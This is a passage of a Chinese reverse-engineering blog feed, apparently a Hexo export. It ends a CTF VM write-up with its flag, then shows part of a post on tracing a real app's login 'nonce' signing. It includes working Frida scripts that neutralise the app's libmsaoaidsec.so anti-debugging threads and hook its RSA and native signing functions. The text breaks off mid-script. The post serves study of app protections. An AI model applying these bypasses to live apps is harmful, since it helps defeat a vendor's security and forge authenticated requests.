r30021: 20 01 01    STO_OUT 0x01, r10024: 20 05 05    STO_OUT 0x05, r50027: 1E          PRINT20028: 00          NOP0029: FF          DB      0xFF   ; unknown002A: 07 01 6F    MOVI    r1, 0x6F002D: 07 04 65    MOVI    r4, 0x650030: 07 02 72    MOVI    r2, 0x720033: 07 06 74    MOVI    r6, 0x740036: 07 00 43    MOVI    r0, 0x430039: 07 05 63    MOVI    r5, 0x63003C: 07 03 72    MOVI    r3, 0x72003F: 06 07 07    XOR     r7, r70042: 20 03 03    STO_OUT 0x03, r30045: 20 01 01    STO_OUT 0x01, r10048: 20 02 02    STO_OUT 0x02, r2004B: 20 00 00    STO_OUT 0x00, r0004E: 20 04 04    STO_OUT 0x04, r40051: 20 06 06    STO_OUT 0x06, r60054: 20 05 05    STO_OUT 0x05, r50057: 20 07 07    STO_OUT 0x07, r7005A: 1E          PRINT2005B: 00          NOP005C: FF          DB      0xFF   ; unknown005D: 07 00 FF    MOVI    r0, 0xFF0060: 09 00 01    SUBI    r0, 0x010063: 12 00 60    JNZ     loc_00600066: 14          RET0067: 00          NOP0068: 00          NOP0069: 07 00 AA    MOVI    r0, 0xAA006C: 07 01 55    MOVI    r1, 0x55006F: 06 00 01    XOR     r0, r10072: 14          RET0073: 00          NOP0074: 00          NOP0075: 07 00 00    MOVI    r0, 0x000078: 13 00 69    CALL    loc_0069007B: 07 01 FF    MOVI    r1, 0xFF007E: 17 00 01    CMP     r0, r10081: 12 00 03    JNZ     loc_00030084: 1C          READ0085: 00          NOP0086: 00          NOP0087: 1F 00 02    LDI_IN  r0, 0x02008A: 18 00 61    CMPI    r0, 0x61008D: 12 00 03    JNZ     loc_00030090: 1F 00 01    LDI_IN  r0, 0x010093: 18 00 6C    CMPI    r0, 0x6C0096: 12 00 03    JNZ     loc_00030099: 1F 00 00    LDI_IN  r0, 0x00009C: 18 00 66    CMPI    r0, 0x66009F: 12 00 03    JNZ     loc_000300A2: 1F 00 03    LDI_IN  r0, 0x0300A5: 18 00 67    CMPI    r0, 0x6700A8: 12 00 03    JNZ     loc_000300AB: 1F 00 04    LDI_IN  r0, 0x0400AE: 18 00 7B    CMPI    r0, 0x7B00B1: 12 00 03    JNZ     loc_000300B4: 1F 00 07    LDI_IN  r0, 0x0700B7: 18 00 54    CMPI    r0, 0x5400BA: 12 00 03    JNZ     loc_000300BD: 1F 00 06    LDI_IN  r0, 0x0600C0: 18 00 49    CMPI    r0, 0x4900C3: 12 00 03    JNZ     loc_000300C6: 1F 00 05    LDI_IN  r0, 0x0500C9: 18 00 48    CMPI    r0, 0x4800CC: 12 00 03    JNZ     loc_000300CF: 1F 00 08    LDI_IN  r0, 0x0800D2: 18 00 43    CMPI    r0, 0x4300D5: 12 00 03    JNZ     loc_000300D8: 1F 00 0C    LDI_IN  r0, 0x0C00DB: 18 00 30    CMPI    r0, 0x3000DE: 12 00 03    JNZ     loc_000300E1: 1F 00 0A    LDI_IN  r0, 0x0A00E4: 18 00 46    CMPI    r0, 0x4600E7: 12 00 03    JNZ     loc_000300EA: 1F 00 0B    LDI_IN  r0, 0x0B00ED: 18 00 32    CMPI    r0, 0x3200F0: 12 00 03    JNZ     loc_000300F3: 1F 00 09    LDI_IN  r0, 0x0900F6: 18 00 54    CMPI    r0, 0x5400F9: 12 00 03    JNZ     loc_000300FC: 1F 00 0D    LDI_IN  r0, 0x0D00FF: 18 00 32    CMPI    r0, 0x320102: 12 00 03    JNZ     loc_00030105: 1F 00 0E    LDI_IN  r0, 0x0E0108: 18 00 35    CMPI    r0, 0x35010B: 12 00 03    JNZ     loc_0003010E: 1F 00 0F    LDI_IN  r0, 0x0F0111: 18 00 5F    CMPI    r0, 0x5F0114: 12 00 03    JNZ     loc_00030117: 1F 00 10    LDI_IN  r0, 0x10011A: 1F 01 0B    LDI_IN  r1, 0x0B011D: 17 00 01    CMP     r0, r10120: 12 00 03    JNZ     loc_00030123: 1F 00 11    LDI_IN  r0, 0x110126: 22 01 A8    LDC     r1, 0x38 &#39;8&#39;   ; imm=0xA8 - 1120129: 17 01 00    CMP     r1, r0012C: 12 00 03    JNZ     loc_0003012F: 1F 00 12    LDI_IN  r0, 0x120132: 09 01 01    SUBI    r1, 0x010135: 17 01 00    CMP     r1, r00138: 12 00 03    JNZ     loc_0003013B: 07 00 80    MOVI    r0, 0x80013E: 15 00       PUSH    r00140: 00          NOP0141: 13 00 5D    CALL    loc_005D0144: 16 00       POP     r00146: 00          NOP0147: 09 00 01    SUBI    r0, 0x01014A: 12 01 3E    JNZ     loc_013E014D: 1F 00 13    LDI_IN  r0, 0x130150: 06 01 00    XOR     r1, r00153: 18 01 52    CMPI    r1, 0x520156: 12 00 03    JNZ     loc_00030159: 1F 00 14    LDI_IN  r0, 0x14015C: 1F 01 17    LDI_IN  r1, 0x17015F: 06 00 01    XOR     r0, r10162: 12 00 03    JNZ     loc_00030165: 18 01 63    CMPI    r1, 0x630168: 12 00 03    JNZ     loc_0003016B: 1F 00 15    LDI_IN  r0, 0x15016E: 1F 01 16    LDI_IN  r1, 0x160171: 03 01 00    SUB     r1, r00174: 18 01 03    CMPI    r1, 0x030177: 12 00 03    JNZ     loc_0003017A: 1F 01 10    LDI_IN  r1, 0x10017D: 08 01 02    ADDI    r1, 0x020180: 17 01 00    CMP     r1, r00183: 12 00 03    JNZ     loc_00030186: 1F 00 18    LDI_IN  r0, 0x180189: 18 00 7D    CMPI    r0, 0x7D018C: 12 00 03    JNZ     loc_0003018F: 1F 00 19    LDI_IN  r0, 0x190192: 18 00 00    CMPI    r0, 0x000195: 12 00 03    JNZ     loc_00030198: 07 00 80    MOVI    r0, 0x80019B: 15 00       PUSH    r0019D: 00          NOP019E: 13 00 5D    CALL    loc_005D01A1: 16 00       POP     r001A3: 00          NOP01A4: 09 00 01    SUBI    r0, 0x0101A7: 12 01 9B    JNZ     loc_019B01AA: 10 00 2A    JMP     loc_002A01AD: FF          DB      0xFF   ; unknown01AE: 00          NOP01AF: 00          NOP</code></pre><p>​具体如何解密出 flag 这里就不赘述了，并不复杂。flag：flag{HITCTF2025_287ec47c}</p><h3 id="三、结语"><a href="#三、结语" class="headerlink" title="三、结语"></a>三、结语</h3><p>​结合 AI 写下来感觉也还好，这两题蛮适合 vm 入门。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> vm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某黑盒 App 登录参数逆向分析</title>
      <link href="/2025/11/03/%E6%9F%90%E9%BB%91%E7%9B%92%20App%20%E7%99%BB%E5%BD%95%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
      <url>/2025/11/03/%E6%9F%90%E9%BB%91%E7%9B%92%20App%20%E7%99%BB%E5%BD%95%E5%8F%82%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="某黑盒-App-登录参数逆向分析"><a href="#某黑盒-App-登录参数逆向分析" class="headerlink" title="某黑盒 App 登录参数逆向分析"></a>某黑盒 App 登录参数逆向分析</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><blockquote><p>​本文章中所有内容仅供学习交流使用，不用于其他任何目的，不提供完整代码，抓包内容、敏感网址、数据接口等均已做脱敏处理，严禁用于商业用途和非法用途，否则由此产生的一切后果均与作者无关.本文章未经许可禁止转载，禁止任何修改后二次传播，擅自使用本文讲解的技术而导致的任何意外，作者均不负责。</p></blockquote><p>​在吾爱论坛上看到一篇写的很详细的<a href="https://www.52pojie.cn/thread-2065441-1-1.html">实战文章</a>，于是就想复现一下，但没找到对应版本的，于是就用了写这篇文章时所下载的最新版本。</p><h4 id="样本基本信息"><a href="#样本基本信息" class="headerlink" title="样本基本信息"></a>样本基本信息</h4><p>包名：com.max.xiaoheihe</p><p>样本：某黑盒</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251103151608013.png" alt="image-20251103151608013"></p><p>​目标参数信息：请求头 noce</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251103151813324.png" alt="image-20251103151813324"></p><h3 id="二、Frida-检测处理"><a href="#二、Frida-检测处理" class="headerlink" title="二、Frida 检测处理"></a>二、Frida 检测处理</h3><p>​先随意写一个脚本进行注入，用来测试 Frida 是否有被检测</p><pre><code class="language-js">Java.perform(function () &#123;  if (Java.available) &#123;    console.log(&quot;Java 环境已加载&quot;);  &#125;&#125;);</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251103152228313.png" alt="image-20251103152228313"></p><p>​可以看到手机上正常进入，但是就是 Frida 进程已经被杀死了，有明显的进程检测的特征，所以接下来看看是哪一个 so 文件加载的线程导致杀死了 Frida 进程。</p><p>​这里和文章的描述略有不同，因为我也不清楚参考文章中所用到的 frida 是否魔改，我用我电脑中的三种（两魔改，一标准）的都试过了，其中一个<a href="https://github.com/hackcatml/ajeossida">魔改</a>的在 hook android_dlopen_ext 时不会被杀死，另一个<a href="https://github.com/Ylarod/Florida">魔改</a>的则和参考文章中的一样，而标准的则会在加载 libglesv3_1.so 时被检测并杀死。</p><pre><code class="language-js">function hook_dlopen() &#123;    Interceptor.attach(Module.findExportByName(null, &quot;android_dlopen_ext&quot;),        &#123;            onEnter: function (args) &#123;                var pathptr = args[0];                if (pathptr !== undefined &amp;&amp; pathptr != null) &#123;                    var path = ptr(pathptr).readCString();                    console.log(&quot;load &quot; + path);                &#125;            &#125;        &#125;    );&#125;</code></pre><pre><code class="language-shell">[M2012K10C::com.max.xiaoheihe ]-&gt; load /data/dalvik-cache/arm64/system@framework@org.apache.http.legacy.jar@classes.dexload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/oat/arm64/base.odexload libforcedarkimpl.soload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libglesv3_1.soload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libmmkv.soload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libtxsoundtouch.soload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libtxffmpeg.soload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libliteavsdk.soload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libflutter.soload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libailab.soload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libnative-lib.soload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libucrash.soload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libumeng-spy.soload /system/lib64/libz.soload /system/lib64/liblog.soload /system/lib64/libm.soload /system/lib64/libdl.soload /system/lib64/libc.soload /data/user/0/com.max.xiaoheihe/files/dynamic_so/libscannative.soload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libsmsdk.soload /data/dalvik-cache/arm64/system@framework@gson.jar@classes.dexload /data/dalvik-cache/arm64/system@app@miui@miui.apk@classes.dexload /data/dalvik-cache/arm64/system@app@miuisystem@miuisystem.apk@classes.dexload /data/dalvik-cache/arm64/system@priv-app@RtMiCloudSDK@RtMiCloudSDK.apk@classes.dexload /data/dalvik-cache/arm64/system@app@MiuiContentCatcher@MiuiContentCatcher.apk@classes.dexload /data/dalvik-cache/arm64/system@app@CatcherPatch@CatcherPatch.apk@classes.dexload /data/app/~~WYOOOcmc05058KwVYe6E1g==/com.max.xiaoheihe-rJ2oVj7AljCYiLOlNFF--A==/lib/arm64/libmsaoaidsec.soProcess terminated[M2012K10C::com.max.xiaoheihe ]-&gt;Thank you for using Frida!</code></pre><p>​关于 libmsaoaidsec.so 的概念可以看看这篇<a href="%5BFrida%E8%BF%9B%E9%98%B6%E2%80%94%E2%80%94libmsaoaidsec.so%E5%8F%8D%E8%B0%83%E8%AF%95%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87-CSDN%E5%8D%9A%E5%AE%A2%5D(https://blog.csdn.net/w987333120/article/details/149257224)">文章</a>。</p><p>​编写 hook 脚本看 libmsaoaidsec.so 是在哪调用了 pthread_create</p><pre><code class="language-js">function hook_dlopen() &#123;    Interceptor.attach(Module.findExportByName(null, &quot;android_dlopen_ext&quot;),        &#123;            onEnter: function (args) &#123;                const fn = args[0];                this.fileName = (fn &amp;&amp; !fn.isNull()) ? fn.readCString() : &quot;&quot;;                console.log(`dlopen onEnter: $&#123;this.fileName&#125;`)                if (this.fileName &amp;&amp; this.fileName.indexOf(&quot;libmsaoaidsec.so&quot;) !== -1) &#123;                    hook_call_constructors()                    hook_dlsym()                &#125;            &#125;, onLeave: function(retval)&#123;                console.log(`dlopen onLeave fileName: $&#123;this.fileName&#125;`)                if(this.fileName != null &amp;&amp; this.fileName.indexOf(&quot;libmsaoaidsec.so&quot;) &gt;= 0)&#123;                    let JNI_OnLoad = Module.getExportByName(this.fileName, &#39;JNI_OnLoad&#39;)                    console.log(`dlopen onLeave JNI_OnLoad: $&#123;JNI_OnLoad&#125;`)                &#125;            &#125;        &#125;    );&#125;  function hook_call_constructors() &#123;    let linker = Process.findModuleByName(&quot;linker64&quot;);    let call_constructors_addr, get_soname;    let symbols = linker.enumerateSymbols();    for (let index = 0; index &lt; symbols.length; index++) &#123;        let symbol = symbols[index];        if (symbol.name === &quot;__dl__ZN6soinfo17call_constructorsEv&quot;) &#123;            call_constructors_addr = symbol.address;        &#125; else if (symbol.name === &quot;__dl__ZNK6soinfo10get_sonameEv&quot;) &#123;            get_soname = new NativeFunction(symbol.address, &quot;pointer&quot;, [&quot;pointer&quot;]);        &#125;    &#125;     console.log(&quot;call_constructors_addr: &quot; + call_constructors_addr)    var listener = Interceptor.attach(call_constructors_addr, &#123;        onEnter: function (args) &#123;            var module = Process.findModuleByName(&quot;libmsaoaidsec.so&quot;)            if (module != null) &#123;                console.log(&quot;libmsaoaidsec.so base address: &quot; + module.base);                listener.detach()            &#125;        &#125;,        onLeave: function (retval) &#123;            console.log(&quot;onLeave call_constructors&quot;)        &#125;    &#125;)&#125;  function hook_dlsym() &#123;    var interceptor = Interceptor.attach(Module.findExportByName(null, &quot;dlsym&quot;),        &#123;            onEnter: function (args) &#123;                const name = ptr(args[1]).readCString()                if (name == &quot;pthread_create&quot;) &#123;                    console.log(&quot;[dlsym]: &quot;, name, &quot; address: &quot;, this.context.lr)                &#125;            &#125;        &#125;    )    return interceptor&#125;setImmediate(hook_dlopen)</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251104102136817.png" alt="image-20251104102136817"></p><p>​通过上图打印的日志信息可以计算 pthread_create 函数的调用位置分别为 0x782daa4d1c、0x782dab04c4，相对于 libmsaoaidsec.so 库文件基地址的偏移地址分别为 0x1BD1C、0x274C4。</p><p>​然后通过这个偏移地址可以去 IDA 中找到这两处的 dlsym。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251104103243170.png" alt="image-20251104103243170"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251104103431012.png" alt="image-20251104103431012"></p><p>​那么就可以在 hook_call_constructors 函数中，使用 Interceptor.replace 将 0x1BD1C 和 0x274C4 这两个函数替换为空函数。</p><p>​完整脚本如下：</p><pre><code class="language-js">function hook_dlopen() &#123;    Interceptor.attach(Module.findExportByName(null, &quot;android_dlopen_ext&quot;),        &#123;            onEnter: function (args) &#123;                const fn = args[0];                this.fileName = (fn &amp;&amp; !fn.isNull()) ? fn.readCString() : &quot;&quot;;                console.log(`dlopen onEnter: $&#123;this.fileName&#125;`)                if (this.fileName &amp;&amp; this.fileName.indexOf(&quot;libmsaoaidsec.so&quot;) !== -1) &#123;                    hook_call_constructors()                    hook_dlsym()                &#125;            &#125;, onLeave: function(retval)&#123;                console.log(`dlopen onLeave fileName: $&#123;this.fileName&#125;`)                if(this.fileName != null &amp;&amp; this.fileName.indexOf(&quot;libmsaoaidsec.so&quot;) &gt;= 0)&#123;                    let JNI_OnLoad = Module.getExportByName(this.fileName, &#39;JNI_OnLoad&#39;)                    console.log(`dlopen onLeave JNI_OnLoad: $&#123;JNI_OnLoad&#125;`)                &#125;            &#125;        &#125;    );&#125;  function hook_call_constructors() &#123;    let linker = null;    linker = Process.findModuleByName(&quot;linker64&quot;);    let call_constructors_addr, get_soname    let symbols = linker.enumerateSymbols();    for (let index = 0; index &lt; symbols.length; index++) &#123;        let symbol = symbols[index];        if (symbol.name === &quot;__dl__ZN6soinfo17call_constructorsEv&quot;) &#123;            console.log(symbol.name)            call_constructors_addr = symbol.address;        &#125; else if (symbol.name === &quot;__dl__ZNK6soinfo10get_sonameEv&quot;) &#123;            console.log(symbol.name)            get_soname = new NativeFunction(symbol.address, &quot;pointer&quot;, [&quot;pointer&quot;]);        &#125;    &#125;     console.log(&quot;call_constructors_addr: &quot; + call_constructors_addr)    let hookCount = 0;    var listener = Interceptor.attach(call_constructors_addr, &#123;        onEnter: function (args) &#123;            var module = Process.findModuleByName(&quot;libmsaoaidsec.so&quot;)            if (module != null) &#123;                console.log(&quot;libmsaoaidsec.so base address: &quot; + module.base);                Interceptor.replace(module.base.add(0x1BD18), new NativeCallback(function () &#123;                    console.log(&quot;0x1BD18: nop成功&quot;, ++hookCount)                &#125;, &quot;void&quot;, []))                Interceptor.replace(module.base.add(0x274C0), new NativeCallback(function () &#123;                    console.log(&quot;0x274C0: nop成功&quot;, ++hookCount)                &#125;, &quot;void&quot;, []))                listener.detach()            &#125;        &#125;,        onLeave: function (retval) &#123;            console.log(&quot;hookCount&quot;, hookCount)        &#125;    &#125;)&#125;  function hook_dlsym() &#123;    var interceptor = Interceptor.attach(Module.findExportByName(null, &quot;dlsym&quot;),        &#123;            onEnter: function (args) &#123;                const name = ptr(args[1]).readCString()                if (name == &quot;pthread_create&quot;) &#123;                    console.log(&quot;[dlsym]: &quot;, name, &quot; address: &quot;, this.context.lr)                &#125;            &#125;        &#125;    )    return Interceptor&#125; setImmediate(hook_dlopen)</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251104105611301.png" alt="image-20251104105611301"></p><h3 id="三、Java-层分析"><a href="#三、Java-层分析" class="headerlink" title="三、Java 层分析"></a>三、Java 层分析</h3><p>​直接搜 nonce 搜不到啥有用的信息，但是在资源文件里看到了 okhttp3 框架。然后参照文章中的方法直接搜接口</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251104113110921.png" alt="image-20251104113110921"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251104113255742.png" alt="image-20251104113255742"></p><p>​这样就可以看到一个接口的信息，这里的话看到接口传入了两个参数，一个是登录的电话号码，一个是密码，但是没有找到请求头和载荷的入参，去看看这个 m122877Z 的调用。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251104114009246.png" alt="image-20251104114009246"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251104114045021.png" alt="image-20251104114045021"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251104114053953.png" alt="image-20251104114053953"></p><p>​可以看到就是一个关于电话号码的拼接，然后传入到 m124367a 进行加密，继续跟进。</p><pre><code class="language-Java">public class utils &#123;    public static ChangeQuickRedirect changeQuickRedirect;    /* renamed from: a */    public static String m124367a(String str) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException &#123;        PatchProxyResult patchProxyResultProxy = PatchProxy.proxy(new Object[]&#123;str&#125;, null, changeQuickRedirect, true, 52396, new Class[]&#123;String.class&#125;, String.class);        if (patchProxyResultProxy.isSupported) &#123;            return (String) patchProxyResultProxy.result;        &#125;        try &#123;            byte[] bytes = str.getBytes();            RSAPublicKey rSAPublicKeyM124368b = m124368b(NDKTools.getrsakey(HeyBoxApplication.m103293M(), C35108a.f172116l, C35108a.f172122m0));            Cipher cipher = Cipher.getInstance(&quot;RSA/ECB/PKCS1Padding&quot;);            cipher.init(1, rSAPublicKeyM124368b);            return Base64.encodeToString(cipher.doFinal(bytes), 0);        &#125; catch (Exception unused) &#123;            return null;        &#125;    &#125;    /* renamed from: b */    public static RSAPublicKey m124368b(String str) throws Exception &#123;        PatchProxyResult patchProxyResultProxy = PatchProxy.proxy(new Object[]&#123;str&#125;, null, changeQuickRedirect, true, 52395, new Class[]&#123;String.class&#125;, RSAPublicKey.class);        if (patchProxyResultProxy.isSupported) &#123;            return (RSAPublicKey) patchProxyResultProxy.result;        &#125;        try &#123;            return (RSAPublicKey) KeyFactory.getInstance(C35739d.f174485a).generatePublic(new X509EncodedKeySpec(Base64.decode(str, 0)));        &#125; catch (NullPointerException unused) &#123;            C15768d.m96188b(&quot;zzzzRSA&quot;, &quot;----------公钥数据为空----------&quot;);            throw new Exception(&quot;公钥数据为空&quot;);        &#125; catch (NoSuchAlgorithmException unused2) &#123;            C15768d.m96188b(&quot;zzzzRSA&quot;, &quot;----------无此算法----------&quot;);            throw new Exception(&quot;无此算法&quot;);        &#125; catch (InvalidKeySpecException unused3) &#123;            C15768d.m96188b(&quot;zzzzRSA&quot;, &quot;----------公钥非法----------&quot;);            throw new Exception(&quot;公钥非法&quot;);        &#125;    &#125;    /* renamed from: c */    public static String m124369c(String str) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException &#123;        PatchProxyResult patchProxyResultProxy = PatchProxy.proxy(new Object[]&#123;str&#125;, null, changeQuickRedirect, true, 52397, new Class[]&#123;String.class&#125;, String.class);        if (patchProxyResultProxy.isSupported) &#123;            return (String) patchProxyResultProxy.result;        &#125;        try &#123;            byte[] bArrDecode = Base64.decode(str, 0);            RSAPublicKey rSAPublicKeyM124368b = m124368b(NDKTools.getrsakey(HeyBoxApplication.m103293M(), C35108a.f172116l, C35108a.f172122m0));            Cipher cipher = Cipher.getInstance(&quot;RSA/ECB/PKCS1Padding&quot;);            cipher.init(2, rSAPublicKeyM124368b);            return new String(cipher.doFinal(bArrDecode));        &#125; catch (Exception unused) &#123;            return null;        &#125;    &#125;&#125;</code></pre><p>​很清晰，是一个没有混淆的 RSA，同时请求里面也可以 看到手机号码和密码都是加密了的。</p><p>​然后看到文章中说该 App 用了 Retrofit 框架，然后也就上网查了一下了解学习一下。</p><ul><li><strong>Retrofit</strong> 是 Android 开发中最常用的 <strong>网络请求框架</strong> 之一，基于 <strong>OkHttp</strong> 实现网络底层，通过 <strong>动态代理</strong> + <strong>注解解析</strong>，把接口调用自动转成网路请求。接口的每个方法调用，其实是通过动态代理被拦截并转成一个 HTTP 请求。</li></ul><p>​即文章中所说它是通过拦截器去添加请求头和载荷的，可以通过 hook getBytes 来找到生成位置堆栈信息。为什么可以通过 hook getBytes 来找到呢？</p><ul><li><p>在分析加密请求或混淆过的 Retrofit 请求时，很多时候拦截器或加密逻辑都在 native 层或混淆代码里执行。此时想要知道 「到底是谁生成了这段被加密的 body」，可以通过 hook Java 关键函数。</p><ul><li><p><code>String.getBytes()</code> 是加密链中的关键点<br>几乎所有的请求载荷在被加密之前，都会经历：</p><ol><li>原始 JSON 拼接（例如：<code>&quot;&#123;\&quot;uid\&quot;:123,\&quot;token\&quot;:\&quot;abc\&quot;&#125;&quot;</code>）</li><li>调用 <code>.getBytes()</code> → 生成 byte[]</li><li>进入加密函数（AES&#x2F;RSA&#x2F;Base64 等）</li><li>写入请求体 → <code>RequestBody.create(MediaType, byte[])</code></li></ol><p>所以，只要在 Java 层 hook String.getBytes() 就能在请求即将被加密的瞬间捕捉到原始明文内容。</p></li></ul></li></ul><p>​然后在注入脚本的时候，注入时机也很重要，这里要先将 libmsaoaidsec.so 中的检测给过掉，然后再注入 hook getBytes 的逻辑，然后再去小黄鸟中找到 <code>*****://***.*********.**/account/login/</code>，通过 nonce 的值去日志中搜，这样一来就可以精准定位到生成位置，位于<strong>com.max.xiaoheihe.router.serviceimpl.i.b</strong>。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251105160709217.png" alt="image-20251105160709217"></p><p>​然后我们继续跟这个方法，结果发现最新版的 x黑盒 已经把这个方法写到 so 层去了，并且还写了个 vm。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251105170732943.png" alt="image-20251105170732943"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251105170753694.png" alt="image-20251105170753694"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251105170808943.png" alt="image-20251105170808943"></p><p>​很清晰，一点混淆都没做，到这一步，但还是想继续复现那篇文章，于是又上网找到了 1.3.333 版本的。</p><p>​重新 hook</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251105171627780.png" alt="image-20251105171627780"></p><p>​再跟踪定位</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251105171210119.png" alt="image-20251105171210119"></p><p>​这就清晰很多了（</p><p>​再往下走就是 getVD 和 getVX，先写一个 hook 脚本和抓包的信息联合一起分析一下，确定一下是不是这里，</p><pre><code class="language-js">function hook_getVD() &#123;  Java.perform(function () &#123;    var SecurityTool = Java.use(&quot;com.max.security.SecurityTool&quot;);    SecurityTool[&quot;getVD&quot;].implementation = function (context, str) &#123;      console.log(        `SecurityTool.getVD is called: context=$&#123;context&#125;, str=$&#123;str&#125;`      );      let result = this[&quot;getVD&quot;](context, str);      console.log(`SecurityTool.getVD result=$&#123;result&#125;`);      return result;    &#125;;  &#125;);&#125;</code></pre><p>​然后也还是先只运行 <strong>hook_dlopen()</strong>，等程序正常启动成了，然后再挂载 <strong>hook_getVD()</strong>，再输入手机号并用密码登录。然后发现 hook 结果和抓包结果是对的上的。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251107102055898.png" alt="image-20251107102055898"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251107102115123.png" alt="image-20251107102115123"></p><p>​继续分析。</p><pre><code class="language-Java">String vd2 = SecurityTool.getVD(HeyBoxApplication.m81850C(), SecurityTool.getVX(HeyBoxApplication.m81850C(), &quot;HPPDCEAENEHBFHPASRDCAMNHJLAAPF&quot;));</code></pre><p>​可以看到传入 getVD 方法的有两个参数，再看看打印出来的日志</p><pre><code class="language-shell">SecurityTool.getVD is called: context=com.max.xiaoheihe.app.HeyBoxApplication@2b73c47, str=lgcqE7gwpVAyG8pQoHpfVee4BEjFdAzRSecurityTool.getVD result=ERqBEkWbdq1qIA0D7v9HFIJgHtKEYDvl</code></pre><p>​第一个参数是设备的上下文信息，第二个参数是 getVX 发给发生成的 32 位字符串。双击跟进可以看到一堆 so 层的 native 函数，找一个 so 文件的加载，然后去 so 层进行分析。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251107102940277.png" alt="image-20251107102940277"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251107102949742.png" alt="image-20251107102949742"></p><h3 id="四、SO-层分析"><a href="#四、SO-层分析" class="headerlink" title="四、SO 层分析"></a>四、SO 层分析</h3><h4 id="1、getVX"><a href="#1、getVX" class="headerlink" title="1、getVX"></a>1、getVX</h4><p>​先看导出函数里有没有该函数（一般大概率不是静态注册，所以应该在这找不到）。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251107103758171.png" alt="image-20251107103758171"></p><p>​那既然是动态注册的，直接去找 <strong>JNI_OnLoad</strong> 函数即可。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251107103835982.png" alt="image-20251107103835982"></p><p>​进到该结构体中，就可以找到了</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251107104030802.png" alt="image-20251107104030802"></p><p>​跟进查看逻辑</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20251107104726478.png" alt="image-20251107104726478"></p><p>​整个函数看下来就只有 sub_A2B50 函数对传进来的 str 进行了处理</p><p>，hook 一下看看</p><pre><code class="language-js">function print_arg(addr) &#123;  if (addr.isNull &amp;&amp; addr.isNull()) return &quot;NULL\n&quot;;  var range = Process.findRangeByAddress(addr);  if (range !== null) &#123;    return hexdump(addr, &#123;length: 64&#125;) + &quot;\n&quot;;  &#125;  return ptr(addr).toString() + &quot;\n&quot;;&#125;function hook_native_addr(funcPtr, paramsNum) &#123;  var module = Process.findModuleByAddress(funcPtr);  Interceptor.attach(funcPtr, &#123;    onEnter: function (args) &#123;      try &#123;        this.logs = [];        